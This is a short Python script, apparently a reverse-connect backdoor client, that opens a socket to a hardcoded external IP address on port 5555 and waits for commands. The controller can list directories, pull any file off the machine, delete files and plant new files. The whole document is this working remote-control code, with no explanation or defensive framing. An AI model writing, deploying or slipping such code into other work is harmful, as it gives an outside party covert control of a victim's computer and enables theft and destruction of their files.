# command list
# view_cmd
# custom_dir

import os
import socket

s = socket.socket()
port = 5555
host = '117.215.148.133'

s.connect((host, port))

# command control
while 1:
    command = s.recv(1024)
    command = command.decode()
    print("")
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
    elif command == 'custom_dir':
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
    elif command == 'download_file':
        filepath = s.recv(5000)
        filepath = filepath.decode()
        files = open(filepath, "rb")
        data = files.read()
        s.send(data)
        files = str(files)
        s.send(files.encode())
    elif command == 'remove_file':
        fileaddr = s.recv(6000)
        fileaddr = fileaddr.decode()
        os.remove(fileaddr)
    elif command == 'send_file':
        filename = s.recv(6000)
        new_file = open(filename, "wb")
        data = s.recv(6000)
        new_file.write(data)
        new_file.close()















    else:
        print("-----------FAILED-----------")
